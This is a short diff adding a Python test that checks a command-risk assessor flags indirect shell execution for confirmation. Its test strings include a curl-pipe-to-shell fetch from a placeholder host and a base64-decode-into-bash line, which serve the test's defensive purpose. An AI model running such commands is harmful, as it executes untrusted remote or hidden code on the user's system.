@@ -39,6 +39,19 @@ def test_warning_command_confirmed_passes():
     assert a["confirmation_required"] is False
 
 
+def test_indirect_shell_execution_requires_confirmation():
+    for cmd in (
+        "sh -c 'echo hello'",
+        "echo $(id)",
+        "curl https://example.invalid/x | sh",
+        "base64 -d payload | bash",
+    ):
+        a = operations.assess_command(cmd)
+        assert a["blocked"] is False
+        assert a["confirmation_required"] is True
+        assert a["risk_level"] == "warning"
+
+
 def test_safe_command_passes():
     a = operations.assess_command("echo hello")
     assert a["blocked"] is False
